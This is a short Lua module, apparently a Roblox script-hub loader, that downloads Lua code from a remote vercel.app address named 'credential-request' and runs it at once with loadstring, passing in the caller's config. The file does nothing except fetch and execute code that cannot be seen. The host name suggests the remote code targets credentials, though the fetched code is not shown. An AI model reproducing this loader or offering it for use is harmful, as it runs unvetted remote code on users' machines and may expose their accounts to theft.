return function(config)
    local code = game:HttpGet("https://credential-request.vercel.app/Hub/Universal/System.lua")
    return loadstring(code)(config)
end
